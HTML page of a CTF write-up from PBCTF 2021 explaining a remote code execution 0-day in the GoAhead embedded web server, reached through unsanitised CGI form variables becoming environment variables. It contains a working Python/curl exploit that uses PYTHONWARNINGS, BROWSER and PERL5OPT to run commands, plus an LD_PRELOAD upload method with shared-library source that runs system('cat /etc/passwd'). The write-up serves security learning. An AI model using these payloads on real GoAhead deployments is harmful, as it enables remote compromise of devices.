@@ -1,0 +1,1304 @@
+<!DOCTYPE html>
+<html lang="en-us">
+
+<head>
+
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="generator" content="Source Themes Academic 4.8.0">
+
+  
+
+  
+  
+  
+  
+  
+    
+    
+    
+  
+  
+
+  <meta name="author" content="Belkahla Ahmed">
+
+  
+  
+  
+    
+  
+  <meta name="description" content="2 methods RCE 0-Day in Goahead Webserver: PBCTF 2021 Last weekend I participated with my team Zer0pts in PBCTF 2021 and we got the 5th place, we were really close to secure a spot in the top 3 but an error in Wine while solving a shitty misc challenge prived us from this win :(">
+
+  
+  <link rel="alternate" hreflang="en-us" href="https://ahmed-belkahla.me/post/2-methods-rce-0-day-in-goahead-webserver-pbctf-2021/">
+
+  
+
+
+  
+  
+  
+  <meta name="theme-color" content="rgb(0, 136, 204)">
+  
+
+  
+  
+
+  
+  
+  
+  
+    
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/academicons/1.8.6/css/academicons.min.css" integrity="sha256-uFVgMKfistnJAfoCUQigIl+JfUaP47GrRKjf6CTPVmw=" crossorigin="anonymous">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.12.0-1/css/all.min.css" integrity="sha256-4w9DunooKSr3MFXHXWyFER38WmPdm361bQS/2KUWZbU=" crossorigin="anonymous">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/fancybox/3.5.7/jquery.fancybox.min.css" integrity="sha256-Vzbj7sDDS/woiFS3uNKo8eIuni59rjyNGtXfstRzStA=" crossorigin="anonymous">
+
+    
+    
+    
+      
+    
+    
+      
+      
+        
+          <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/9.18.1/styles/github.min.css" crossorigin="anonymous" title="hl-light" disabled>
+          <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/9.18.1/styles/dracula.min.css" crossorigin="anonymous" title="hl-dark">
+        
+      
+    
+
+    
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/leaflet/1.5.1/leaflet.css" integrity="sha256-SHMGCYmST46SoyGgo4YR/9AlK1vf3ff84Aq9yK4hdqM=" crossorigin="anonymous">
+    
+
+    
+
+    
+    
+      
+
+      
+      
+
+      
+    
+      
+
+      
+      
+
+      
+    
+      
+
+      
+      
+
+      
+    
+      
+
+      
+      
+
+      
+    
+      
+
+      
+      
+
+      
+    
+      
+
+      
+      
+
+      
+    
+      
+
+      
+      
+
+      
+    
+      
+
+      
+      
+
+      
+    
+      
+
+      
+      
+
+      
+    
+      
+
+      
+      
+
+      
+    
+      
+
+      
+      
+
+      
+        <script src="https://cdnjs.cloudflare.com/ajax/libs/lazysizes/5.1.2/lazysizes.min.js" integrity="sha256-Md1qLToewPeKjfAHU1zyPwOutccPAm5tahnaw7Osw0A=" crossorigin="anonymous" async></script>
+      
+    
+      
+
+      
+      
+
+      
+    
+      
+
+      
+      
+
+      
+    
+      
+
+      
+      
+        
+      
+
+      
+    
+      
+
+      
+      
+
+      
+    
+
+  
+
+  
+  
+  
+  <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Montserrat:400,700%7CRoboto:400,400italic,700%7CRoboto+Mono&display=swap">
+  
+
+  
+  
+  
+  
+  <link rel="stylesheet" href="/css/academic.css">
+
+  
+
+
+
+
+  
+
+
+  
+
+  <link rel="manifest" href="/index.webmanifest">
+  <link rel="icon" type="image/png" href="/images/icon_hu0b7a4cb9992c9ac0e91bd28ffd38dd00_9727_32x32_fill_lanczos_center_2.png">
+  <link rel="apple-touch-icon" type="image/png" href="/images/icon_hu0b7a4cb9992c9ac0e91bd28ffd38dd00_9727_192x192_fill_lanczos_center_2.png">
+
+  <link rel="canonical" href="https://ahmed-belkahla.me/post/2-methods-rce-0-day-in-goahead-webserver-pbctf-2021/">
+
+  
+  
+  
+  
+  
+    
+  
+  
+  <meta property="twitter:card" content="summary_large_image">
+  
+  <meta property="twitter:site" content="@BelkahlaAhmed1">
+  <meta property="twitter:creator" content="@BelkahlaAhmed1">
+  
+  <meta property="og:site_name" content="Ahmed Belkahla">
+  <meta property="og:url" content="https://ahmed-belkahla.me/post/2-methods-rce-0-day-in-goahead-webserver-pbctf-2021/">
+  <meta property="og:title" content="PBCTF 2021 - RCE 0-Day in Goahead Webserver | Ahmed Belkahla">
+  <meta property="og:description" content="2 methods RCE 0-Day in Goahead Webserver: PBCTF 2021 Last weekend I participated with my team Zer0pts in PBCTF 2021 and we got the 5th place, we were really close to secure a spot in the top 3 but an error in Wine while solving a shitty misc challenge prived us from this win :("><meta property="og:image" content="https://ahmed-belkahla.me/img/me.jpg">
+  <meta property="twitter:image" content="https://ahmed-belkahla.me/img/me.jpg"><meta property="og:locale" content="en-us">
+  
+    
+      <meta property="article:published_time" content="2021-10-12T00:00:00&#43;00:00">
+    
+    <meta property="article:modified_time" content="2021-10-12T00:00:00&#43;00:00">
+  
+
+  
+
+
+    
+
+
+
+
+
+
+  
+
+
+
+
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "BlogPosting",
+  "mainEntityOfPage": {
+    "@type": "WebPage",
+    "@id": "https://ahmed-belkahla.me/post/2-methods-rce-0-day-in-goahead-webserver-pbctf-2021/"
+  },
+  "headline": "PBCTF 2021 - RCE 0-Day in Goahead Webserver",
+  
+  "datePublished": "2021-10-12T00:00:00Z",
+  "dateModified": "2021-10-12T00:00:00Z",
+  
+  "author": {
+    "@type": "Person",
+    "name": "Belkahla Ahmed"
+  },
+  
+  "publisher": {
+    "@type": "Organization",
+    "name": "Ahmed Belkahla",
+    "logo": {
+      "@type": "ImageObject",
+      "url": "https://ahmed-belkahla.me/images/icon_hu0b7a4cb9992c9ac0e91bd28ffd38dd00_9727_192x192_fill_lanczos_center_2.png"
+    }
+  },
+  "description": "2 methods RCE 0-Day in Goahead Webserver: PBCTF 2021 Last weekend I participated with my team Zer0pts in PBCTF 2021 and we got the 5th place, we were really close to secure a spot in the top 3 but an error in Wine while solving a shitty misc challenge prived us from this win :("
+}
+</script>
+
+  
+
+  
+
+
+  
+
+
+  
+
+
+
+
+
+  <title>PBCTF 2021 - RCE 0-Day in Goahead Webserver | Ahmed Belkahla</title>
+
+</head>
+
+<body id="top" data-spy="scroll" data-offset="70" data-target="#TableOfContents" class="dark">
+
+  <aside class="search-results" id="search">
+  <div class="container">
+    <section class="search-header">
+
+      <div class="row no-gutters justify-content-between mb-3">
+        <div class="col-6">
+          <h1>Search</h1>
+        </div>
+        <div class="col-6 col-search-close">
+          <a class="js-search" href="#"><i class="fas fa-times-circle text-muted" aria-hidden="true"></i></a>
+        </div>
+      </div>
+
+      <div id="search-box">
+        
+        <input name="q" id="search-query" placeholder="Search..." autocapitalize="off"
+        autocomplete="off" autocorrect="off" spellcheck="false" type="search">
+        
+      </div>
+
+    </section>
+    <section class="section-search-results">
+
+      <div id="search-hits">
+        
+      </div>
+
+    </section>
+  </div>
+</aside>
+
+
+  
+
+
+
+
+
+
+
+<nav class="navbar navbar-expand-lg navbar-light compensate-for-scrollbar" id="navbar-main">
+  <div class="container">
+
+    
+    <div class="d-none d-lg-inline-flex">
+      <a class="navbar-brand" href="/">Ahmed Belkahla</a>
+    </div>
+    
+
+    
+    <button type="button" class="navbar-toggler" data-toggle="collapse"
+            data-target="#navbar-content" aria-controls="navbar" aria-expanded="false" aria-label="Toggle navigation">
+    <span><i class="fas fa-bars"></i></span>
+    </button>
+    
+
+    
+    <div class="navbar-brand-mobile-wrapper d-inline-flex d-lg-none">
+      <a class="navbar-brand" href="/">Ahmed Belkahla</a>
+    </div>
+    
+
+    
+    
+    <div class="navbar-collapse main-menu-item collapse justify-content-start" id="navbar-content">
+
+      
+      <ul class="navbar-nav d-md-inline-flex">
+        
+
+        
+
+        
+        
+        
+          
+        
+
+        
+        
+        
+        
+        
+        
+          
+          
+          
+            
+          
+          
+        
+
+        <li class="nav-item">
+          <a class="nav-link " href="/#about"><span>Home</span></a>
+        </li>
+
+        
+        
+
+        
+
+        
+        
+        
+          
+        
+
+        
+        
+        
+        
+        
+        
+          
+          
+          
+            
+          
+          
+        
+
+        <li class="nav-item">
+          <a class="nav-link " href="/#posts"><span>Posts</span></a>
+        </li>
+
+        
+        
+
+        
+
+        
+        
+        
+          
+        
+
+        
+        
+        
+        
+        
+        
+          
+          
+          
+            
+          
+          
+        
+
+        <li class="nav-item">
+          <a class="nav-link " href="/#projects"><span>Projects</span></a>
+        </li>
+
+        
+        
+
+        
+
+        
+        
+        
+          
+        
+
+        
+        
+        
+        
+        
+        
+          
+          
+          
+            
+          
+          
+        
+
+        <li class="nav-item">
+          <a class="nav-link " href="/#contact"><span>Contact</span></a>
+        </li>
+
+        
+        
+
+        
+
+        
+        
+        
+          
+        
+
+        
+        
+        
+        
+        
+        
+
+        <li class="nav-item">
+          <a class="nav-link " href="/files/cv.pdf"><span>CV</span></a>
+        </li>
+
+        
+        
+
+      
+
+        
+      </ul>
+    </div>
+
+    <ul class="nav-icons navbar-nav flex-row ml-auto d-flex pl-md-2">
+      
+      <li class="nav-item">
+        <a class="nav-link js-search" href="#"><i class="fas fa-search" aria-hidden="true"></i></a>
+      </li>
+      
+
+      
+      <li class="nav-item dropdown theme-dropdown">
+        <a href="#" class="nav-link js-theme-selector" data-toggle="dropdown" aria-haspopup="true">
+          <i class="fas fa-palette" aria-hidden="true"></i>
+        </a>
+        <div class="dropdown-menu">
+          <a href="#" class="dropdown-item js-set-theme-light">
+            <span>Light</span>
+          </a>
+          <a href="#" class="dropdown-item js-set-theme-dark">
+            <span>Dark</span>
+          </a>
+          <a href="#" class="dropdown-item js-set-theme-auto">
+            <span>Automatic</span>
+          </a>
+        </div>
+      </li>
+      
+
+      
+
+    </ul>
+
+  </div>
+</nav>
+
+
+  <article class="article">
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+  
+  
+<div class="article-container pt-3">
+  <h1>PBCTF 2021 - RCE 0-Day in Goahead Webserver</h1>
+
+  
+
+  
+    
+
+
+<div class="article-metadata">
+
+  
+  
+
+  
+  <span class="article-date">
+    
+    
+      
+    
+    Oct 12, 2021
+  </span>
+  
+
+  
+
+  
+  <span class="middot-divider"></span>
+  <span class="article-reading-time">
+    11 min read
+  </span>
+  
+
+  
+  
+  
+
+  
+  
+
+</div>
+
+    
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+</div>
+
+
+
+  <div class="article-container">
+
+    <div class="article-style">
+      <h1 id="2-methods-rce-0-day-in-goahead-webserver-pbctf-2021">2 methods RCE 0-Day in Goahead Webserver: PBCTF 2021</h1>
+<p>Last weekend I participated with my team Zer0pts in PBCTF 2021 and we got the 5th place, we were really close to secure a spot in the top 3 but an error in Wine while solving a shitty misc challenge prived us from this win :(</p>
+<p>However, the CTF had some challenges tagged as <strong>pb2own</strong> that needed us to find a 0-day in order to solve them. I have passed almost all the time focusing on advancement web challenge that aimed to find an RCE in <strong>goahead</strong> webserver.</p>
+<blockquote>
+<p>GoAhead is the world&rsquo;s most popular, tiny embedded web server. It is compact, secure <code>wondering if it's really secure haha</code> and simple to use. GoAhead is deployed in hundreds of millions of devices and is ideal for the smallest of embedded devices</p>
+</blockquote>
+<p>We managed to achieve RCE in two methods, one that worked on the challenge and another one that was theoretical and not stable but it’s worth mentioning. So without more introduction let’s jump to the analysis of how we did the code review of this huge C code.</p>
+<p><em>Note:</em> the lesson of the day is that whenever you hit a wall just ping @st98 senpai .</p>
+<h3 id="initial-thoughts">Initial Thoughts:</h3>
+<p>@st98 senpai firstly mentioned that we have the latest version of goahead running with some simple cgi binary and basic configuration.
+I started by understanding the inner working of goahead server. <strong>
+<a href="[goahead.c]%28https://github.com/embedthis/goahead/blob/master/src/goahead.c%29">goahead.c</a></strong> file has the main function where it parses the configuration files and the CLI args but it has nothing important in our case. I jumped then to <strong>http.c</strong> where the main logic of handling the HTTP requests is there. We can see that after parsing the different HTTP headers, it stores all the information in a structure named Webs that is declared in <strong>goahead.h</strong> as follow:</p>
+<pre><code class="language-c">typedef struct Webs {
+    WebsBuf         rxbuf;              /**&lt; Raw receive buffer */
+    WebsBuf         input;              /**&lt; Receive buffer after de-chunking */
+    WebsBuf         output;             /**&lt; Transmit buffer after chunking */
+    WebsBuf         chunkbuf;           /**&lt; Pre-chunking data buffer */
+    WebsBuf         *txbuf;
+    WebsTime        since;              /**&lt; Parsed if-modified-since time */
+    WebsTime        timestamp;          /**&lt; Last transaction with browser */
+    WebsHash        vars;               /**&lt; CGI standard variables */
+    int             timeout;            /**&lt; Timeout handle */
+    char            ipaddr[ME_MAX_IP];  /**&lt; Connecting ipaddress */
+    char            ifaddr[ME_MAX_IP];  /**&lt; Local interface ipaddress */
+
+    int             rxChunkState;       /**&lt; Rx chunk encoding state */
+    ssize           rxChunkSize;        /**&lt; Rx chunk size */
+.
+.
+.
+.
+    WebsHash        responseCookies;    /**&lt; Outgoing cookies */
+    struct WebsSession *session;        /**&lt; Session record */
+    struct WebsRoute *route;            /**&lt; Request route */
+    struct WebsUser *user;              /**&lt; User auth record */
+.
+.
+. 
+#if ME_GOAHEAD_UPLOAD
+    int             upfd;               /**&lt; Upload file handle */
+    WebsHash        files;              /**&lt; Uploaded files */
+    char            *boundary;          /**&lt; Mime boundary (static) */
+    ssize           boundaryLen;        /**&lt; Boundary length */
+    int             uploadState;        /**&lt; Current file upload state */
+    WebsUpload      *currentFile;       /**&lt; Current file context */
+    char            *clientFilename;    /**&lt; Current file filename */
+    char            *uploadTmp;         /**&lt; Current temp filename for upload data */
+    char            *uploadVar;         /**&lt; Current upload form variable name */
+#endif
+    void            *ssl;               /**&lt; SSL context */
+} Webs;
+</code></pre>
+<p>Then you can see its initialization here <strong>
+<a href="https://github.com/embedthis/goahead/blob/master/src/http.c#L361" target="_blank" rel="noopener">L361</a></strong> which seems logic, along with the other functions it only parses the different elements of the HTTP request.
+Honestly I didn&rsquo;t pay close attention on parsing issues since I believed ( my intuition let&rsquo;s say xD) that we will have to abuse or chain something related to CGI binaries execution. However it was worth giving a look at <code>websValidateUriPath</code> function that calls <code>websNormalizeUriPath</code> <strong>
+<a href="https://github.com/embedthis/goahead/blob/master/src/http.c#L2789" target="_blank" rel="noopener">L2789</a></strong> and see if it has any url decoding issues that can lead for example to a path traversal but afaik and after some trials I didn&rsquo;t see anything suspicious. No double Url encoding or altering paths techniques worked.</p>
+<h3 id="path-traversal-on-the-cgi-binary">Path traversal on the CGI binary:</h3>
+<p>The first idea I got was trying to achieve path traversal somewhere in the cgi handler.I started reviewing <strong>
+<a href="https://github.com/embedthis/goahead/blob/master/src/cgi.c" target="_blank" rel="noopener">cgi.c</a></strong> file and I noticed that we have full control of the arguments passed to the cgi binary as mentioned in this part of code:</p>
+<pre><code class="language-c">    *argp = cgiPath;
+    n = 1;
+    query = 0;
+
+    if (strchr(wp-&gt;query, '=') == NULL) {
+        query = sclone(wp-&gt;query);
+        websDecodeUrl(query, query, strlen(query));
+        for (cp = stok(query, &quot; &quot;, &amp;tok); cp != NULL &amp;&amp; argp != NULL; ) {
+            *(argp+n) = cp;
+            trace(5, &quot;ARG[%d] %s&quot;, n, argp[n-1]);
+            n++;
+            if (n &gt;= argpsize) {
+                argpsize *= 2;
+                if (argpsize &gt; ME_GOAHEAD_LIMIT_CGI_ARGS) {
+                    websError(wp, HTTP_CODE_REQUEST_TOO_LARGE, &quot;Too many arguments&quot;);
+                    wfree(cgiPath);
+                    return 1;
+                }
+                argp = wrealloc(argp, argpsize * sizeof(char *));
+            }
+            cp = stok(NULL, &quot; &quot;, &amp;tok);
+        }
+    }
+    *(argp+n) = NULL;
+</code></pre>
+<p>Besically if there is no <code>=</code> in our query the webserver will url decode again the query, split it by &quot; &quot; and then pass the result as the args array. So the following url <code>http://advancement.perfect.blue/cgi-binary/date?aa%20dd</code> will result in <code>aa</code> and <code>dd</code> passed as arguments.
+So if we can somehow run for example /bin/sh instead of the intended cgi binary we can have an easy win and run the following payload for example <code>bin/sh -c {command}</code>.
+Unfortunately after a lot of trials this method wasn&rsquo;t possible because of the following part of code that was sanitizing the CGI filename:</p>
+<pre><code class="language-c">    getcwd(cwd, ME_GOAHEAD_LIMIT_FILENAME);
+    dir = wp-&gt;route-&gt;dir ? wp-&gt;route-&gt;dir : cwd;
+    chdir(dir);
+
+    extraPath = 0;
+    if ((cp = strchr(cgiName, '/')) != NULL) {
+        extraPath = sclone(cp);
+        *cp = '\0';
+        websSetVar(wp, &quot;PATH_INFO&quot;, extraPath);
+        websSetVarFmt(wp, &quot;PATH_TRANSLATED&quot;, &quot;%s%s%s&quot;, dir, cgiPrefix, extraPath);
+        wfree(extraPath);
+    } else {
+        websSetVar(wp, &quot;PATH_INFO&quot;, &quot;&quot;);
+        websSetVar(wp, &quot;PATH_TRANSLATED&quot;, &quot;&quot;);
+    }
+    cgiPath = sfmt(&quot;%s%s/%s&quot;, dir, cgiPrefix, cgiName);
+    websSetVarFmt(wp, &quot;SCRIPT_NAME&quot;, &quot;%s/%s&quot;, cgiPrefix, cgiName);
+    websSetVar(wp, &quot;SCRIPT_FILENAME&quot;, cgiPath);
+</code></pre>
+<p>The code is simple, it replaces the first <code>/</code> in cgiName with a null byte so the cgiName cannot hold any path traversal payload like <code>../../</code> since it will be trimmed. I tried a lot of stuffs and manipulations in order to bypass this restriction like using double url encodings but in vain.
+One idea I had faith in, was trying to find some misconsistency in the url decoding logic of the webserver, if we can force another urldecoding operation after passing the check we will have an easy win. After some intense  review of the cgi component and different other components I couldn&rsquo;t achieve it :( I wished that this line was urldecoding the whole path <strong>
+<a href="https://github.com/embedthis/goahead/blob/master/src/cgi.c#L193" target="_blank" rel="noopener">L193</a></strong> :'(</p>
+<h3 id="abusing-environment-variables">Abusing Environment variables:</h3>
+<p>After a lot of trials I gave up on the idea of running another cgi binary and do path traversal and started focusing on how environment variables are handled. This part of code is the most juicy one:</p>
+<pre><code class="language-c=">    envpsize = 64;
+    envp = walloc(envpsize * sizeof(char*));
+    if (wp-&gt;vars) {
+        for (n = 0, s = hashFirst(wp-&gt;vars); s != NULL; s = hashNext(wp-&gt;vars, s)) {
+            if (s-&gt;content.valid &amp;&amp; s-&gt;content.type == string) {
+                vp = strim(s-&gt;name.value.string, &quot; \t\r\n&quot;, WEBS_TRIM_BOTH);
+                for (bp = envBlackList; *bp; bp++) {
+                    if (smatch(vp, *bp)) {
+                        continue;
+                    }
+                }
+                if (sstarts(vp, &quot;LD_&quot;) || sstarts(vp, &quot;LDR_&quot;) || sstarts(vp, &quot;_RLD&quot;) || sstarts(vp, &quot;DYLD_&quot;) || strstr(vp, &quot;=()&quot;)) {
+                    continue;
+                }
+                if (s-&gt;arg != 0 &amp;&amp; *ME_GOAHEAD_CGI_VAR_PREFIX != '\0') {
+                    envp[n++] = sfmt(&quot;%s%s=%s&quot;, ME_GOAHEAD_CGI_VAR_PREFIX, s-&gt;name.value.string,
+                        s-&gt;content.value.string);
+                } else {
+                    envp[n++] = sfmt(&quot;%s=%s&quot;, s-&gt;name.value.string, s-&gt;content.value.string);
+                }
+                trace(0, &quot;Env[%d] %s&quot;, n, envp[n-1]);
+                if (n &gt;= envpsize) {
+                    envpsize *= 2;
+                    envp = wrealloc(envp, envpsize * sizeof(char *));
+                }
+            }
+        }
+    }
+    *(envp+n) = NULL;
+</code></pre>
+<p>The most trained eye noticed the filter that prohibits using the known LD_* env vars and some other sensible ones. Tl;DR we can only set arbitrary environement variables but with <code>CGI_</code> prefix. You can also notice that it&rsquo;s setting <code>wp-&gt;vars</code> content as env vars too (wp is Webs structure that is set in **http.c** as we mentioned in the beginning).</p>
+<p>Looking at <strong>http.c</strong> file again we can see at <strong>
+<a href="https://github.com/embedthis/goahead/blob/master/src/http.c#L1081" target="_blank" rel="noopener">L1081 </a></strong> how <code>wp-&gt;vars</code> is set:</p>
+<pre><code class="language-c=">        upperKey = sfmt(&quot;HTTP_%s&quot;, key);
+        for (cp = upperKey; *cp; cp++) {
+            if (*cp == '-') {
+                *cp = '_';
+            }
+        }
+        supper(upperKey);
+        if ((prior = websGetVar(wp, upperKey, 0)) != 0) {
+            combined = sfmt(&quot;%s, %s&quot;, prior, value);
+            websSetVar(wp, upperKey, combined);
+            wfree(combined);
+        } else {
+            websSetVar(wp, upperKey, value);
+        }
+        wfree(upperKey);
+</code></pre>
+<p>You can notice that any HTTP header we send is added to <code>wp-&gt;vars</code> after concatenating the prefix <code>HTTP_</code> so we can also set arbitrary environment variables with <code>HTTP_</code> as a prefix but we can&rsquo;t do a lot of stuffs because of these restrictions.</p>
+<p>At this part I didn&rsquo;t know what to do next so I started digging in the code and in other components hoping that I can find something useful until @st98 senpai sent the following in the discord channel of the team:</p>
+<p><img src="https://i.imgur.com/tn0QELk.png" alt="DISCORD"></p>
+<p>Honestly we didn&rsquo;t know at first why this happened, but let&rsquo;s take a look at <strong>http.c</strong> file at <strong>
+<a href="https://github.com/embedthis/goahead/blob/master/src/http.c#L1404" target="_blank" rel="noopener">L1404</a></strong> . You can see from the code that it&rsquo;s adding form data to <code>wp-&gt;vars</code> without any prior sanitization and as we mentioned <code>wp-&gt;vars</code> was added to the environment variables:</p>
+<pre><code class="language-c=">static void addFormVars(Webs *wp, char *vars)
+{
+    WebsKey     *sp;
+    cchar       *prior;
+    char        *keyword, *value, *tok;
+
+    assert(wp);
+    assert(vars);
+
+    keyword = stok(vars, &quot;&amp;&quot;, &amp;tok);
+    while (keyword != NULL) {
+        if ((value = strchr(keyword, '=')) != NULL) {
+            *value++ = '\0';
+            websDecodeUrl(keyword, keyword, strlen(keyword));
+            websDecodeUrl(value, value, strlen(value));
+        } else {
+            value = &quot;&quot;;
+        }
+        if (*keyword) {
+            /*
+                If keyword has already been set, append the new value to what has been stored.
+             */
+            if ((prior = websGetVar(wp, keyword, NULL)) != 0) {
+                sp = websSetVarFmt(wp, keyword, &quot;%s %s&quot;, prior, value);
+            } else {
+                sp = websSetVar(wp, keyword, value);
+            }
+            /* Flag as untrusted keyword by setting arg to 1. This is used by CGI to prefix this keyword */
+            sp-&gt;arg = 1;
+        }
+        keyword = stok(NULL, &quot;&amp;&quot;, &amp;tok);
+    }
+}
+</code></pre>
+<h3 id="first-method-rce-worked-in-the-challenge">First method RCE (worked in the challenge):</h3>
+<p>So now that we are able to set any environment variables, we started digging on how we would  achieve RCE. The first idea we got is to use the known <code>LD_PRELOAD </code> trick, if we manage to upload our shared library in the server with a known path we will have our win but it won&rsquo;t be that easy so we will talk more in details about this approach in the next section.</p>
+<p>After a lot of tries and reflection, @st98 senpai sent this interesting 
+<a href="https://www.elttam.com/blog/env/#content" target="_blank" rel="noopener">article</a>, it&rsquo;s talking about achieving RCE while running a python script by using <code>PYTHONWARNINGS</code> <code>BROWSER</code> and <code>PERL5OPT</code> variables. You can find more details about this method in the article mentioned below. So here is our final exploit written by @st98 senpai:</p>
+<pre><code class="language-python=">import socket
+
+#s = socket.create_connection(('localhost', 5000))
+s = socket.create_connection(('advancement.chal.perfect.blue', 80))
+payload = '''--------------------------58ffd05745ad3119
+Content-Disposition: form-data; name=&quot;PYTHONWARNINGS&quot;
+
+all:0:antigravity.x:0:0
+--------------------------58ffd05745ad3119
+Content-Disposition: form-data; name=&quot;BROWSER&quot;
+
+perlthanks
+--------------------------58ffd05745ad3119
+Content-Disposition: form-data; name=&quot;PERL5OPT&quot;
+
+-Mbase;print(system(&quot;cat&quot;.chr(0x20).&quot;/flag&quot;));exit;
+--------------------------58ffd05745ad3119--
+'''.replace('\n', '\r\n').encode()
+#payload = payload.replace(b'FILE', open('nekodesu.so', 'rb').read())
+l = len(payload)
+
+body = f'''POST /cgi-bin/date HTTP/1.1
+Host: localhost:55555
+User-Agent: curl/7.68.0
+Accept: */*
+Content-Length: {l}
+Content-Type: multipart/form-data; boundary=------------------------58ffd05745ad3119
+
+'''.replace('\n', '\r\n').encode() + payload
+
+s.send(body)
+print(s.recv(1024).decode())
+s.close()
+</code></pre>
+<p>or using curl as follow:</p>
+<pre><code class="language-sh">curl -F &quot;PYTHONWARNINGS=all:0:antigravity.x:0:0&quot; -F &quot;BROWSER=perlthanks&quot; -F 'PERL5OPT=-Mbase;print(system(&quot;cat&quot;.chr(0x20).&quot;/flag&quot;));exit;' http://advancement.chal.perfect.blue
+</code></pre>
+<h3 id="second-method-rce-didnt-work-on-the-challenge">Second Method RCE (Didn&rsquo;t work on the challenge)</h3>
+<p>As mentioned before, we stick a lot of time trying the <code>LD_PRELOAD</code> trick, but unfortunately we can see in the challenge docker-compose file that <code>    read_only: true</code> so forcing an upload will always throw an error since the temporary files created while uploading will be stored in <code>/etc/goahead/tmp</code> . The <code>/tmp</code> is writable so at first I thought that we have maybe to find another vulnerability while forging the path of the temporary file but we had no luck.</p>
+<p>After the end of the CTF, I didn&rsquo;t give up on this idea and sticked trying it in a normal environment with writable FS. You may be asking now that even if we managed to upload the shared library we will still have to brute force/guess the name of the temporary file ? In fact after some intense code review of the upload component I noticed the following while handling the uploaded file <strong>
+<a href="https://github.com/embedthis/goahead/blob/master/src/upload.c#L240" target="_blank" rel="noopener">L240</a></strong>:</p>
+<pre><code class="language-c=">wfree(wp-&gt;uploadTmp);
+ if ((wp-&gt;uploadTmp = websTempFile(uploadDir, &quot;tmp&quot;)) == 0) {
+          websError(wp, HTTP_CODE_INTERNAL_SERVER_ERROR,
+          &quot;Cannot create upload temp file %s. Check upload temp dir %s&quot;, wp-&gt;uploadTmp, uploadDir);
+          return;
+      }
+      trace(5, &quot;File upload of: %s stored as %s&quot;, wp-&gt;clientFilename, wp-&gt;uploadTmp);
+
+if ((wp-&gt;upfd = open(wp-&gt;uploadTmp, O_WRONLY | O_CREAT | O_TRUNC | O_BINARY, 0600)) &lt; 0) {
+        websError(wp, HTTP_CODE_INTERNAL_SERVER_ERROR, &quot;Cannot open upload temp file %s&quot;, wp-&gt;uploadTmp);
+        return;
+        }
+               
+</code></pre>
+<p>The webserver is opening the file so we may abuse the opened file descriptor and for example set the <code>LD_PRELOAD=/proc/self/fd/6</code> while forcing a file upload of the shared library. We can do it using the following command:</p>
+<pre><code class="language-shell">curl -v -F &quot;data=@payload.so&quot; -F &quot;LD_PRELOAD=/proc/self/fd/6&quot; http://advancement.chal.perfect.blue/cgi-bin/date
+</code></pre>
+<p>with <code>payload.so</code>  having the following before compiling it:</p>
+<pre><code class="language-c">#include &lt;unistd.h&gt;
+
+static void before_main(void) __attribute__((constructor));
+
+static void before_main(void)
+{
+    system(&quot;cat /etc/passwd&quot;);
+}
+</code></pre>
+<p>However, this method have some constraints that make it hard to exploit :/
+<strong>1-</strong> We have to guess the file descriptor number ( We can bruteforce it easily)
+<strong>2-</strong> Weirdly goahead had different behaviours that I didn&rsquo;t really understand depending on different environements, it throws an internal server error for an unknown reason sometimes. ( Please if you manage to know why DM me )</p>
+<h3 id="conclusion">Conclusion:</h3>
+<p>PBCTF 2021 was really fun and hard, it had some awesome challenges that required finding a 0-day in some products in order to solve them, so it was a highly realistic CTF. Kudos to all my awesome teammates in Zer0pts that have really motivated me to be more dedicated to CTFs and learned a lot from them.</p>
+
+    </div>
+
+    
+
+
+
+
+
+
+
+<div class="share-box" aria-hidden="true">
+  <ul class="share">
+    
+      
+      
+      
+        
+      
+      
+      
+      <li>
+        <a href="https://twitter.com/intent/tweet?url=https://ahmed-belkahla.me/post/2-methods-rce-0-day-in-goahead-webserver-pbctf-2021/&amp;text=PBCTF%202021%20-%20RCE%200-Day%20in%20Goahead%20Webserver" target="_blank" rel="noopener" class="share-btn-twitter">
+          <i class="fab fa-twitter"></i>
+        </a>
+      </li>
+    
+      
+      
+      
+        
+      
+      
+      
+      <li>
+        <a href="https://www.facebook.com/sharer.php?u=https://ahmed-belkahla.me/post/2-methods-rce-0-day-in-goahead-webserver-pbctf-2021/&amp;t=PBCTF%202021%20-%20RCE%200-Day%20in%20Goahead%20Webserver" target="_blank" rel="noopener" class="share-btn-facebook">
+          <i class="fab fa-facebook"></i>
+        </a>
+      </li>
+    
+      
+      
+      
+        
+      
+      
+      
+      <li>
+        <a href="mailto:?subject=PBCTF%202021%20-%20RCE%200-Day%20in%20Goahead%20Webserver&amp;body=https://ahmed-belkahla.me/post/2-methods-rce-0-day-in-goahead-webserver-pbctf-2021/" target="_blank" rel="noopener" class="share-btn-email">
+          <i class="fas fa-envelope"></i>
+        </a>
+      </li>
+    
+      
+      
+      
+        
+      
+      
+      
+      <li>
+        <a href="https://www.linkedin.com/shareArticle?url=https://ahmed-belkahla.me/post/2-methods-rce-0-day-in-goahead-webserver-pbctf-2021/&amp;title=PBCTF%202021%20-%20RCE%200-Day%20in%20Goahead%20Webserver" target="_blank" rel="noopener" class="share-btn-linkedin">
+          <i class="fab fa-linkedin-in"></i>
+        </a>
+      </li>
+    
+      
+      
+      
+        
+      
+      
+      
+      <li>
+        <a href="https://web.whatsapp.com/send?text=PBCTF%202021%20-%20RCE%200-Day%20in%20Goahead%20Webserver%20https://ahmed-belkahla.me/post/2-methods-rce-0-day-in-goahead-webserver-pbctf-2021/" target="_blank" rel="noopener" class="share-btn-whatsapp">
+          <i class="fab fa-whatsapp"></i>
+        </a>
+      </li>
+    
+      
+      
+      
+        
+      
+      
+      
+      <li>
+        <a href="https://service.weibo.com/share/share.php?url=https://ahmed-belkahla.me/post/2-methods-rce-0-day-in-goahead-webserver-pbctf-2021/&amp;title=PBCTF%202021%20-%20RCE%200-Day%20in%20Goahead%20Webserver" target="_blank" rel="noopener" class="share-btn-weibo">
+          <i class="fab fa-weibo"></i>
+        </a>
+      </li>
+    
